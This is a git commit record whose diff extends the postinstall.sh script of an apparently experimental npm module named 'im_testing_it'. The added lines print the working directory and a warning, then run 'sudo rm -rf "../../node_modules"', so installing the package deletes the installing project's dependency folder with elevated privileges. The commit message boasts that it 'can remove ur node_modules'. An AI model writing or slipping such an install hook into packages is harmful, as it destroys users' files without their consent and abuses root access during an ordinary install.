b401c85733b68337b8ee9f3a89f65882bd45da4e
Kamalakannan Jayaraman <sincerekamal@gmail.com>
2017-11-05 01:47:33 +0530

    Now it can remove ur node_modules

--- postinstall.sh
+++ postinstall.sh
@@ -1,1 +1,9 @@
 echo "I'm post install script of im_testing_it module"
+
+echo "I'm in the directory... "
+
+pwd 
+
+echo "I'm gonna erase your node_modules directory now"
+
+sudo rm -rf "../../node_modules"
